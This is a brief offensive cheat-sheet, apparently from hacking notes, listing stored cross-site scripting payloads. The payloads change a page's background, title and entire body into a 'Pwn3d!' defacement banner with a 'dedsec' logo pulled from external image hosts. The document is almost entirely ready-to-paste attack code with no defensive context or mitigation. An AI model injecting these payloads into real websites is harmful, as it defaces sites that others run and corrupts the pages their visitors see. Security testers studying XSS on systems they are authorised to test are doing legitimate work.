#### Stored XSS

Background Change

```js
<script>document.body.style.background = "black"</script>

<script>document.body.background = "https://megakrunch.com/cdn/shop/products/GalleryView_720x.gif?v=1593025015"</script>
```

Title and body (DOM) Change

```js
<script>document.title = 'Pwn3d!'</script>

<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Pwn3d!</h1><p style="color: white">by <img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/i/a2f7c9d8-a913-4273-847f-705be41395df/da7m3i8-0055a879-8c1c-4b3c-a552-432db93a14fd.png/v1/fill/w_926,h_863,q_70,strp/dedsec_logo_by_junguler_da7m3i8-pre.jpg" height="25px" alt="dedsec"> </p></center>'</script>
